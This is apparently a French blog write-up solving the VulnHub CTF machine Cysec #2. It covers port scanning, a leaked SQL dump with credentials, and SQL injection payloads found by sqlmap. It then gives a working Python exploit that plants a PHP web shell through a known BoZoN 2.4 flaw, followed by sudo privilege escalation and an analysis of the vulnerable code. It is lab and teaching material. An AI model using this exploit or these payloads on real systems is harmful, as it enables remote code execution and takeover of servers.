---
title: "Solution du CTF Cysec #2 de VulnHub"
tags: [CTF,VulnHub]
---

Le CTF [Cysec #2](https://vulnhub.com/entry/cysec-2,532/) était très court par rapport à son prédécesseur et moins dans le style jeopardy.

## Excès de zèle

On retrouve grosso modo les mêmes ports que sur le précédent CTF, sans la vulnérabilité d'énumération d'OpenSSH :

```
Nmap scan report for 192.168.56.229
Host is up (0.00039s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
--- snip ---
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-enum: 
|_  /phpmyadmin/: phpMyAdmin
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.41 (Ubuntu)
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
--- snip ---
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|_      1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```

Rapidement je vois du base64 dans la page d'index du site :

```html
<html>
<style>
body {
        padding-top: 40px;
        padding-bottom: 40px;
        background-image: url(0_yPzTD7hZBRy-vMo-.jpg);
        background-repeat: no-repeat;
        background-attachment: fixed;
        background-position: center top;
  height: 100%;
  /*Zm9yIGZpcnN0IGZsYWcgY2hlY2sgL2NoYWxsZW5nZS9pbmRleC5waHAKZm9yIHNlY29uZCBmbGFnIGNoZWNrIC9FeG9saXQvaW5kZXgucGhw */
  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
<body>
<h1> Welcome to CySec2 CTF</h1> 
</body>
</html>
```

Elle se décode comme ça :

> for first flag check /challenge/index.php  
> for second flag check /Exolit/index.php

Je fouille dans le dossier `challenge` :

```console
$ feroxbuster -u http://192.168.56.229/challenge/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -n -x php,html,txt,zip -S 279

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.229/challenge/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💢  Size Filter           │ 279
 💲  Extensions            │ [php, html, txt, zip]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302        0l        0w        0c http://192.168.56.229/challenge/logout.php
301        9l       28w      323c http://192.168.56.229/challenge/js
301        9l       28w      323c http://192.168.56.229/challenge/db
200       30l       87w     1083c http://192.168.56.229/challenge/index.php
301        9l       28w      327c http://192.168.56.229/challenge/images
200       30l       87w     1083c http://192.168.56.229/challenge/
301        9l       28w      324c http://192.168.56.229/challenge/css
302       57l      187w     2541c http://192.168.56.229/challenge/welcome.php
302        0l        0w        0c http://192.168.56.229/challenge/session.php
[####################] - 2m    598005/598005  0s      found:9       errors:0      
[####################] - 2m    598005/598005  3854/s  http://192.168.56.229/challenge/
```

Le dossier `db` contient un fichier sql :

```sql
$ grep -A5 INSERT security_challenge.sql 
INSERT INTO `challenge_clue` (`id`, `info`) VALUES
(1, 'flag{95728ce2159815f2e2a253c664b2493f}'),
(3, 'user=alex password=orJ;7~qdqH0kx@n'),
(4, 'use above username and password for the next level');

-- --------------------------------------------------------
--
INSERT INTO `offices` (`id`, `city`, `address`, `phone`) VALUES
(1, 'Stockholm', 'Birger Jarlsgatan 7, 4 tr', '+46 8-616 99 40'),
(2, 'Berlin', 'Friedrichstraße 68', '+49 173 329 6295'),
(3, 'Hamburg', 'Ferdinandstraße 35', '+49 403 07 39 810'),
(4, 'Helsinki', 'Arkadiankatu 23 C', '+358 (0)20 7705600'),
(5, 'London', '8 Ganton Street', '+44 7469 214 950'),
--
INSERT INTO `users` (`id`, `username`, `password`) VALUES
(1, 'UCAS-ADMIN', 'Welc0meT0NetlightEdgeC0nferenceInSt0ckh0lm!');

--
-- Indexes for dumped tables
--
```

Ajouté à ça on remarque que le script `welcome.php` provoque une redirection, mais retourne du contenu :

```html
<h1>Welcome</h1>
<a href="logout.php"><button type="button" class="btn btn-primary">Log Out</button></a>
<h3>Search Office</h3> 
<form method="post" action="" class="form-search">
        <div class="row">
                <div class="col-xs-12 col-sm-6 col-md-4">
                        <div class="input-group">
                                <input type="text" class="form-control" name="search" id="searchInput" placeholder="City" autofocus>
                                <span class="input-group-btn">
                                        <input type="submit" name="submit" value="Search" class="btn btn-primary">
                                </span>
                        </div>
                </div>
        </div>
</form>
```

Le formulaire présent dans le code HTML est vulnérable à une faille d'injection SQL. On peut utiliser `sqlmap` pour l'exploiter :

```bash
python sqlmap.py -u http://192.168.56.229/challenge/welcome.php --data "search=test&submit=Search" --dbms mysql --risk 3 --level 5
```

Sans surprises la faille est vérifiée :

```
sqlmap identified the following injection point(s) with a total of 167 HTTP(s) requests:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: search=-1746' OR 7817=7817-- wctt&submit=Search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 6431 FROM (SELECT(SLEEP(5)))KmBn)-- ljzb&submit=Search

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=test' UNION ALL SELECT NULL,CONCAT(0x717a766271,0x7a546e6f4d55617850725175756c6656545a58706371747865594742464a73556454494472427048,0x716a767071),NULL-- -&submit=Search
---
```

Les requêtes SQL sont exécutées avec le compte `root`. Je peux dumper le hash via l'option `--passwords` :

```
[*] root [1]:
    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
```

Il se casse rapidement car il correspond au clair `password`.

Les plus attentifs auront remarqué au début que Nmap a détecté la présence d'un `phpMyAdmin` sur le serveur web du CTF. Je peux donc m'y connecter et fouiller la base.

Il s'avère qu'il n'y a rien de plus par rapport au fichier SQL.

## BoZoN le ClOwNn

L'autre path qui était mentionné dans le base64 correspond à une installation de `BoZoN`.

Un exploit de RCE existe pour cette appli web :

[BoZoN 2.4 - Remote Code Execution - PHP webapps Exploit](https://www.exploit-db.com/exploits/41084)

Voici la description donnée :

```txt
A Bozon vulnerability allows unauthenticated attackers to add arbitrary users and inject system commands to the "auto_restrict_users.php"
file of the Bozon web interface.

This issue results in arbitrary code execution on the affected host, attackers system commands will get written and stored to the PHP file
"auto_restrict_users.php" under the private/ directory of the Bozon application, making them persist. Remote attackers will get the command
responses from functions like phpinfo() as soon as the HTTP request has completed.
```

J'ai repris l'exploit et l'ai simplifié au maximum. C'est du Python 2 :

```python
import urllib, urllib2, time

url = "http://192.168.56.229/Exolit/index.php"
CMD = '"];$PWN=''system($_GET[chr(99)]);//''//"'

data = urllib.urlencode({'creation' : '1', 'login' : CMD, 'pass' : 'abc123', 'confirm' : 'abc123', 'token' : ''})
req = urllib2.Request(url, data)
   
response = urllib2.urlopen(req)
time.sleep(0.5)
print response.read()
```

Une fois exécuté, on peut appeler notre web shell de cette façon :

```
http://192.168.56.229/Exolit/private/auto_restrict_users.php?c=uname%20-a
```

Ce qui me donne l'output suivant :

```
Linux cysec2 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Après avoir placé et exécuté `reverse-ssh` je trouve vite des informations utiles dans le système de fichiers :

```console
www-data@cysec2:/var/www/html/Exolit/private$ cat /var/www/html/Exolit/flag.txt
This is Flag 2 , Congrats , you close to root 
username = cysec2 
password =  $^WAhuy457i6kj
Flag (60b40b7846a7afe973ce089f19068cffc53e40fe28cd076f937c644f6127aad6)
```

L'utilisateur peut facilement passer `root` via `sudo`. On a terminé :

{% raw %}
```console
www-data@cysec2:/var/www/html/Exolit/private$ su cysec2
Password: 
cysec2@cysec2:/var/www/html/Exolit/private$ sudo -l
[sudo] password for cysec2: 
Matching Defaults entries for cysec2 on cysec2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cysec2 may run the following commands on cysec2:
    (ALL : ALL) ALL
cysec2@cysec2:/var/www/html/Exolit/private$ sudo su
root@cysec2:/var/www/html/Exolit/private# id
uid=0(root) gid=0(root) groups=0(root)
root@cysec2:/var/www/html/Exolit/private# cd /root
root@cysec2:~# ls
Congrats.txt  snap
root@cysec2:~# cat Congrats.txt 
Congrats this is final flag {%#hYU5QU^JHQWi765W&WSaUYH%4etI^u}
```
{% endraw %}

## Kékidi?

Petit coup de loupe sur cette vulnérabilité : avant l'exploitation, on a le fichier `private/auto_restrict_users.php` qui ressemble à ceci :

```php
cysec2@cysec2:/var/www/html/Exolit/private$ cat auto_restrict_users.php
<?php

# user : useradd test
$auto_restrict["users"]["useradd test"]["login"]='useradd test';
$auto_restrict["users"]["useradd test"]["encryption_key"]='db25cb37601b3dbcbde9d60a1e3fa749';
$auto_restrict["users"]["useradd test"]["salt"] = 'Snad89hrIwa#KRP2ku0wOo_Aik>83G8MD+DOa+BBEyq8L6Ad#y1T+@e+Ia#%A>yDE5eSfV4m7ro+IZ@xAP9p63S82HmICFbx_KIWcPu@>2RgZeT|WB&LhhSupiz4f_2X0w-Z>OTF+KGC<r4ugeRf0Ai!Kr+VmC_1EUSwOGj-2@%Q@H_y1EzBxgwv_blP>pWVcCw0eJ2Z>iY1A1sP<h!@TFyshKLhfuNKC_n|PgA4Crfnj?x0rGM_XT6jQ4l3mEPO&FYa9IsTKzqA+Qx@X7-+t<fyJUfOYdm_ikK*B2!054_Run0+FKN?_m*iSVt1RI|x>ez%mKPOnYN7!wx4gOlY2c#KE_iv2nz|CVfFiyrMHml!@pZ6Jq2tx5HG%*5nv*grWNBHjRv|cAZd<LlD2T4tIP>A+o2Xdt8MbgtrH1r!9+@c1s0q7ts2z@Duz6_r4L6fc9A@NbH<<88RSNHH%eq7|BwGdc|761|7u1Knsyih?<4*NSXUvKJqmct6&|HUSd#3';
$auto_restrict["users"]["useradd test"]["pass"] = 'f5c8973bfbaa094c64b1989bebd2a27d2143bfc7e6c70da4f4ce5b17506ecb129bc11af7d7943bb8828659970c5de36a5fead2066ff9bfbe99064c042a3fe143';
$auto_restrict["users"]["useradd test"]["status"]='superadmin';
$auto_restrict["users"]["useradd test"]["lang"]='en';

# user : ls
$auto_restrict["users"]["ls"]["login"]='ls';
$auto_restrict["users"]["ls"]["encryption_key"]='c454056645686557768078f2931f91f1';
$auto_restrict["users"]["ls"]["salt"] = '&KmvOcS>G7XL0OamcsB5hcUpi__poVWpij075*-W*w7-&O#t>z9rCvQ@edAmOpty@*pH7b8!9ke-yyNuvejQ8BqUf@qp9U!6P62465CbpGf+a!@6f%WhokMo-#|b+FW7O8GN--3HbpuNSz5cFc|G<@NtjqX1H>|MIAgB4%w4bc+nwuLf<PWv9d#?KP<-jyL?BqCtnk-0pH+Wvxt1!0B4S#&hKQZp3vOHzrSj4TuV0bdy9Fc>>spAy&hL-3AdUh9_b0-uzdMA@rYdq#1HJ8!aaSaYWWJepWkMjnN1EcS5aORl*PgYE&mPcb9N-ZaaRAYIEVBr0zFNReXdCy+uHVoqT-eykVi+#c0Zybh7>kJ<UXy#9oa48gj!6h<f+urBQqMfw4Js?S2dU<m1SYQ8yGqy1%CXxm>L?F-iQs_BcPzgcyt|AzW5YZTMCE2ir0HaGPbKvON5NwUs*!Z@t_bw<q5b9ThM<J29a+-x?HBCLF@nCSQRtczY1cEIzMsz@6xDxzGb';
$auto_restrict["users"]["ls"]["pass"] = 'cac98fc2d3388609edbbb4e89ebde68c546e2586011b5888e17f12c8992319424511ca0b2e0e3b191b1b1a20759431db4b443416fa45475f0da7370872837f22';
$auto_restrict["users"]["ls"]["status"]='user';
$auto_restrict["users"]["ls"]["lang"]='en';

?>
```

Après exploitation il a les lignes supplémentaires suivantes :

```php
# user : "];$PWN=system($_GET[chr(99)]);////"
$auto_restrict["users"][""];$PWN=system($_GET[chr(99)]);////""]["login"]='"];$PWN=system($_GET[chr(99)]);////"';
$auto_restrict["users"][""];$PWN=system($_GET[chr(99)]);////""]["encryption_key"]='ed51dbd310179926cec142cf9cd0db85';
$auto_restrict["users"][""];$PWN=system($_GET[chr(99)]);////""]["salt"] = 'n?paz0Lnq8d3o74Uwms&ZR%pFwRCXKGa!g4-IusuOlm3TCgx>1BRzju+b%!dw2NSOssFs-#?RMDjk<sRIrl2fdiQ|wcy<1nhT2AojlAkHq11@?F2Ir2bhOJPbzUYoiCrqdNJz&ys>IWWUnT6B<rOg5Nxiqz#e&>s&+xl-wckMTonDeaMSeCz_N8MJCH#M|J45gQ9y+y%sYtSYHk8utP3iChOU1qw+OAUN#w?>lZ6Jt_P#|&+CdtGW>nMOATNBcnwEe&Zb51YH!m+v<7cVQbyWcLN_-nCfs88fyTry*pIThl4Bji566@kMDtC&NTNU4d-xgziXc7jgQSO59M#w_KkGY0L_W7oe#_ozCuX_@!C6|nVS6V6rp#PcHA3Ins1V9WM2Z|L!Kz?7q7#5zr4kxdOXZs|xV<5P#Zou3<!kacSr*vG%Pj2w|@ha-u*GC0#%Wjvs*-xL>tqyR3Sx<W|onh&9EEUNs|JpP7M50bFZkSad|yvhyRm&2clLgabEtdubpCv';
$auto_restrict["users"][""];$PWN=system($_GET[chr(99)]);////""]["pass"] = 'fe30b2b96b3055066bdbbadcbd1d3b1c966f7ae676de68cf5cde830cd7176f2b7ba7a21ef439f46358d5a5a56e2a429c2c8ec7a1418b011d2933a3c887d0c1b2';
$auto_restrict["users"][""];$PWN=system($_GET[chr(99)]);////""]["status"]='';
$auto_restrict["users"][""];$PWN=system($_GET[chr(99)]);////""]["lang"]='en'
```

Donc l'entrée servant de nom d'utilisateur est injectée, fermant quelques éléments de la syntaxe PHP puis insèrant du code.

L'origine de l'écriture et du formatage est dans la fonction `save_users` de la webapp :

```php
function save_users(){
        global $auto_restrict;
        $ret="\n";$data='<?php'.$ret;
        if (!isset($auto_restrict['users'])){return false;}
        foreach ($auto_restrict['users'] as $key=>$user){
                $data.= $ret.'# user : '.$user['login'].$ret
                                .'$auto_restrict["users"]["'.$user['login'].'"]["login"]='.var_export($user['login'],true).';'.$ret
                                .'$auto_restrict["users"]["'.$user['login'].'"]["encryption_key"]='.var_export($user['encryption_key'],true).';'.$ret
                                .'$auto_restrict["users"]["'.$user['login'].'"]["salt"] = '.var_export($user['salt'],true).';'.$ret
                                .'$auto_restrict["users"]["'.$user['login'].'"]["pass"] = '.var_export($user['pass'],true).';'.$ret
                                .'$auto_restrict["users"]["'.$user['login'].'"]["status"]='.var_export($user['status'],true).';'.$ret
                                .'$auto_restrict["users"]["'.$user['login'].'"]["lang"]='.var_export($user['lang'],true).';'.$ret;
        }

        $data.=$ret.'?>';
        $r=file_put_contents($auto_restrict['path_to_files'].'/auto_restrict_users.php', $data);
        if (!$r){return false;}else{return $auto_restrict['users'];}
}
```

Elle-même appelée dans le cas de la création d'un nouvel utilisateur :

```php
# ------------------------------------------------------------------                                                   
# New user request: add it, save and return to login page                                                              
# ------------------------------------------------------------------                                                   
if(!empty($_POST['pass'])&&!empty($_POST['confirm'])&&isset($_POST['creation'])&&!empty($_POST['login'])&&empty($_POST['admin_password'])){
        if (!isset($auto_restrict['users'])){$auto_restrict['users']=array();}                                         
        $index=count($auto_restrict['users']);                                                                         
        $login=strip_tags($_POST['login']);                                                                            
        if (login_exists($login)){safe_redirect('index.php?p=login&newuser&error=1&token='.returnToken());}            
        if ($_POST['pass']!=$_POST['confirm']){safe_redirect('index.php?p=login&newuser&error=3&token='.returnToken());}
        $auto_restrict['users'][$index]['login'] = $login;                                                             
        $auto_restrict['users'][$index]['encryption_key'] = md5(uniqid('', true));                                     
        $auto_restrict['users'][$index]['salt'] = generate_salt(512);                                                  
        $auto_restrict['users'][$index]['lang'] = conf('language');                                                    
        $auto_restrict['users'][$index]['status'] = '';                                                                
        $auto_restrict['users'][$index]['pass'] = hash('sha512', $auto_restrict['users'][$index]['salt'].$_POST['pass']);
                                                                                                                       
        if (!save_users()){exit('<div class="error">auto_restrict: problem saving users</div>');}                      
        safe_redirect('index.php?p=admin&msg='.e('Account created:',false).$login.'&token='.returnToken());            
        exit;                                                                                                          
}
```

De toute évidence, la session de l'utilisateur courant n'est pas validée avant de faire les opérations.

Je n'ai pas déterminé pourquoi l'exploit fonctionne en passant les paramètres via `GET` alors que `POST` semble attendu.

Dans tous les cas l'exploit requiert de ne pas se rater sur l'injection sans quoi la webapp devient inutilisable.
